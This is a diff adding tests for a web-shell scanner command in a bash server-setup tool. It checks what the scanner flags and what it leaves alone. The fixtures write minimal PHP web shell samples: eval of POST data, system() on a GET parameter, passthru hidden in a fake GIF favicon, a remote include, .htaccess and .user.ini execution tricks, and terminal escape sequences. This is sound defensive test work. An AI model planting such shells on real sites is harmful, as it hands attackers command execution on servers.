@@ -23,7 +23,7 @@ INSTALL_DIR="$TMP/install"; BIN_LINK="$TMP/lompstack"; BIN_SHORT="$TMP/lomp"; LO
 OPT_YES=1 OPT_DRY_RUN=0 OPT_QUIET=1 OPT_VERBOSE=0 OPT_NO_COLOR=1 OPT_JSON=0 OPT_NON_INTERACTIVE=1
 SCRIPT_PATH="$ROOT/setup.sh"; SCRIPT_DIR="$ROOT"
 export TMPDIR="$TMP"
-for m in common system ols php db ssl domain harden proxy app mail webmail cloudflare backup monitor install menu; do
+for m in common system ols php db ssl domain harden scan proxy app mail webmail cloudflare backup monitor install menu; do
   # shellcheck source=/dev/null
   source "$ROOT/lib/$m.sh"
 done
@@ -4931,6 +4931,124 @@ STATE_DIR="$_hd_state"; HARDEN_PHP_INI_ROOT="$_hd_ini"; SITEFW_DIR="$_hd_fw"; SI
 # shellcheck disable=SC2086
 unset -f $_hd_fns _hd_site _hd_m; eval "$_hd_saved"
 lib_domain_state_reset
+
+# =============================================================================
+section "scan: what a web shell is made of, and not what an honest file has"
+# The files below are what the command is for and what it must leave alone. Each check reads
+# the records the awk program prints (P = a file, F = a finding in it), then the command's own
+# output once.
+_sc_saved="$(declare -f lib_domains_list)"
+_sc_state="$STATE_DIR"; STATE_DIR="$TMP/sc-state"
+eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
+for _d in sc1.example.com sc2.example.com; do
+  mkdir -p "$STATE_DIR/domains/$_d" "$SITES_ROOT/$_d/public_html"; printf '{}\n' >"$STATE_DIR/domains/$_d/domain.json"
+done
+_sc="$SITES_ROOT/sc1.example.com"; _scp="$_sc/public_html"
+mkdir -p "$_scp/wp-content/uploads/2026" "$_scp/lib"
+_sc_b64="$(printf 'QUJD%.0s' $(seq 1 400))"   # 1600 characters of base64
+# an honest file: the same functions, used the way applications use them
+cat >"$_scp/lib/honest.php" <<EOF
+<?php
+// evaluate the form, then include the header: system requirements are checked in exec order
+// \$_POST['name'] (string) is the visitor's name; class FilesManager stores what was sent
+\$data = base64_decode(\$row['payload']);
+\$pdo->exec("DELETE FROM log"); \$out = curl_exec(\$ch); Db::exec(\$sql); \$r = \$this->system(\$x);
+\$s = preg_replace('/\s+/i', ' ', \$s); \$t = preg_replace('#<e>#', '', \$t);
+require_once \$_SERVER['DOCUMENT_ROOT'] . '/config.php'; include 'header.php';
+if (isset(\$_POST['name'])) { \$name = trim(\$_POST['name']); \$obj->save(\$_POST['name']); }
+echo '<img src="data:image/png;base64,${_sc_b64}">';
+echo "\xEF\xBB\xBF" . chr(13) . chr(10);
+EOF
+printf '<?php eval(base64_decode("ZWNobyAxOw=="));\n' >"$_scp/a-decoded.php"
+printf '<?php\n\n@eval ( $_POST["c"] );\n' >"$_scp/b-request.php"
+printf '<?php echo "<pre>"; system($_GET["cmd"]); ?>\n' >"$_scp/c-command.php"
+printf '<?php $_GET["f"]($_GET["a"]);\n' >"$_scp/d-named.php"
+printf '<?php include($_REQUEST["p"]);\n' >"$_scp/e-include.php"
+printf '<?php include "http://203.0.113.9/x.txt";\n' >"$_scp/f-remote.PHP"
+printf '<?php /* WSO Shell */ $default_action = "FilesMan";\n' >"$_scp/g-known.phtml"
+printf 'GIF89a<?php passthru($_COOKIE["x"]);\n' >"$_scp/favicon.ico"
+printf '<?php $c = gzinflate(base64_decode($s)); $f($_POST["a"]);\n' >"$_scp/h-packed.php"
+printf '<?php $p = "%s";\n' "$_sc_b64" >"$_scp/i-long.php"
+printf '<?php $k = "%s";\n' "$(printf '\\x6a%.0s' $(seq 1 25))" >"$_scp/j-hex.php"
+printf '<?php $n = %s"";\n' "$(printf 'chr(1%.0s).' $(seq 1 9))" >"$_scp/k-chr.php"
+printf '<?php // Silence is golden.\n' >"$_scp/wp-content/uploads/2026/index.php"
+printf 'auto_prepend_file = /home/sc1.example.com/public_html/a-decoded.php\n' >"$_scp/.user.ini"
+printf 'AddType application/x-httpd-php .jpg\n' >"$_scp/.htaccess"
+printf '<?php file_put_contents("x.php", $_POST["body"]); preg_replace("/.*/e", $_x, "");\n' >"$_scp/l-write.php"
+printf '<?php eval(base64_decode("x")); // \033[2J\033]0;owned\007 \302\233 31m\n' >"$_scp/m-escape.php"
+: >"$_scp/empty.php"
+_rec="$(_scan_run "$_sc" 0)"
+_sc_file() { awk -F'\t' -v f="$1" '$1 == "P" { on = ($3 == f) } on' <<<"$_rec"; }   # the records of one file
+assert_lacks "an honest file is not listed" "honest.php" "$_rec"
+assert_lacks "nor an empty one" "empty.php" "$_rec"
+for _c in "a-decoded.php|eval of decoded data" "b-request.php|eval of what the request sent" \
+          "c-command.php|a command made of what the request sent" "d-named.php|a function named by the request" \
+          "e-include.php|include of a file the request names" "f-remote.PHP|include from an address or a stream" \
+          "g-known.phtml|the name of a known web shell" "favicon.ico|PHP code in a file that is not named as a script"; do
+  _r="$(_sc_file "public_html/${_c%%|*}")"
+  assert_has "strong: ${_c%%|*}" $'P\tH\tpublic_html/'"${_c%%|*}" "$_r"
+  assert_has "  as ${_c##*|}" "${_c##*|}" "$_r"
+done
+assert_has "the line is named" $'F\tH\t3\teval of what the request sent\t@eval ( $_POST["c"] );' "$(_sc_file public_html/b-request.php)"
+for _c in "h-packed.php|decoding inside decoding (packed code)" "h-packed.php|a function held in a variable, called with request data" \
+          "i-long.php|a long encoded string (1600 characters)" "j-hex.php|text hidden as \\x escapes (25 on one line)" \
+          "k-chr.php|text put together from chr() pieces" "wp-content/uploads/2026/index.php|a script in an upload directory" \
+          ".user.ini|a file run before or after every script" ".htaccess|file types handed to PHP" \
+          "l-write.php|what the request sent, written to a file" "l-write.php|preg_replace with the e modifier"; do
+  _r="$(_sc_file "public_html/${_c%%|*}")"
+  assert_has "worth a look: ${_c%%|*}" $'P\tL\tpublic_html/'"${_c%%|*}" "$_r"
+  assert_has "  as ${_c##*|}" "${_c##*|}" "$_r"
+done
+assert_has "every file read is counted, the empty one too" $'N\t19\t0' "$_rec"
+assert_eq  "a finding is reported once per file" 1 "$(printf '<?php\neval(base64_decode("a"));\neval(base64_decode("b"));\n' >"$_scp/a-decoded.php"; _scan_run "$_sc" 0 | grep -c $'^F\tH\t[0-9]*\teval of decoded data\teval(base64_decode("[ab]' || true)"
+# what the site's files say reaches a terminal as printable characters only
+_r="$(_sc_file public_html/m-escape.php)"
+assert_has   "text from a file is shown" 'eval(base64_decode("x")); // ?[2J?]0;owned? ?? 31m' "$_r"
+assert_lacks "without its escape sequences" $'\033' "$_rec"
+if printf '<?php eval($_POST[1]);\n' >"$_scp/n"$'\033[31m\n'".php" 2>/dev/null; then
+  _rec="$(_scan_run "$_sc" 0)"
+  assert_has   "a file name keeps to one line" $'P\tH\tpublic_html/n?[31m?.php' "$_rec"
+  assert_lacks "and brings no escape sequence" $'\033' "$_rec"
+  rm -f "$_scp/n"$'\033[31m\n'".php"
+fi
+# --wide lists every use, the honest ones too
+_rec="$(_scan_run "$_sc" 1)"; _r="$(_sc_file public_html/lib/honest.php)"
+assert_has   "--wide lists a file that only uses base64_decode" "uses base64_decode()" "$_r"
+assert_lacks "a method called exec is not process execution" "starts a process" "$_r"
+assert_lacks "nor is the word in a comment eval" "uses eval()" "$_r"
+assert_has   "--wide names the call that starts a process" "starts a process" "$(_sc_file public_html/c-command.php)"
+# a link is not followed: what it names is not this site's
+if (( CAN_SYMLINK )); then
+  printf '<?php eval($_POST[1]);\n' >"$TMP/sc-outside.php"
+  ln -s "$TMP/sc-outside.php" "$_scp/linked.php"; mkdir -p "$TMP/sc-outdir"; cp "$TMP/sc-outside.php" "$TMP/sc-outdir/x.php"; ln -s "$TMP/sc-outdir" "$_scp/linkdir"
+  _rec="$(_scan_run "$_sc" 0)"
+  assert_lacks "a linked file is not read" "linked.php" "$_rec"
+  assert_lacks "nor a linked directory entered" "linkdir" "$_rec"
+fi
+# the command: strong findings first, the counts, and nothing changed
+_sc_sum() { find "$_sc" -type f -exec cksum {} + | sort; }
+_before="$(_sc_sum)"
+_out="$(OPT_QUIET=0; rc=0; lib_scan_main --all >"$TMP/sc-out" 2>&1 || rc=$?; cat "$TMP/sc-out"; printf 'rc=%s' "$rc")"
+assert_eq  "scan changes no file" "$_before" "$(_sc_sum)"
+assert_has "it exits 0, findings or not" "rc=0" "$_out"
+assert_has "a strong finding is shown with its file" "  STRONG  public_html/b-request.php" "$_out"
+assert_has "its line and what it is" "          line 3: eval of what the request sent" "$_out"
+assert_has "and the text there" '            @eval ( $_POST["c"] );' "$_out"
+assert_has "a finding that has no line is shown without one" "          a script in an upload directory" "$_out"
+assert_has "the site's counts" "sc1.example.com: 9 file(s) with strong signs of a web shell, 8 more worth a look" "$_out"
+assert_has "a clean site says so" "sc2.example.com: nothing found in 0 files" "$_out"
+assert_has "what a match means is said once" "A match is a reason to open the file, not a verdict" "$_out"
+_first_look="$(grep -n '  LOOK    ' "$TMP/sc-out" | head -1 | cut -d: -f1)"; _last_strong="$(grep -n '  STRONG  ' "$TMP/sc-out" | tail -1 | cut -d: -f1)"
+assert_true "strong findings come before the rest" test "$_last_strong" -lt "$_first_look"
+_out="$(OPT_QUIET=0; lib_scan_main sc2.example.com 2>&1)"
+assert_lacks "a clean run has no advice to give" "A match is a reason" "$_out"
+assert_false "a site that is not registered is refused" bash -c "$(declare -f lib_scan_main lib_scan_usage lib_domain_valid lib_domain_registered lib_domain_json lib_die 2>/dev/null); STATE_DIR='$STATE_DIR'; lib_scan_main nosuch.example.com >/dev/null 2>&1"
+assert_false "--all and a domain together are refused" bash -c "$(declare -f lib_scan_main lib_scan_usage lib_die 2>/dev/null); lib_scan_main --all sc1.example.com >/dev/null 2>&1"
+assert_has "setup.sh has the command" 'scan)           lib_scan_main' "$(cat "$ROOT/setup.sh")"
+assert_has "it takes no lock: it only reads" 'list|status|doctor|credentials|logs|menu|scan) ;;' "$(cat "$ROOT/setup.sh")"
+assert_has "the menu offers it"       '24) _menu_scan' "$(cat "$ROOT/lib/menu.sh")"
+assert_has "and the command reference" 'scan <domain>|--all [--wide]' "$(lib_usage)"
+STATE_DIR="$_sc_state"; unset -f _sc_file _sc_sum; eval "$_sc_saved"
 
 printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
 if (( FAIL > 0 )); then exit 1; fi
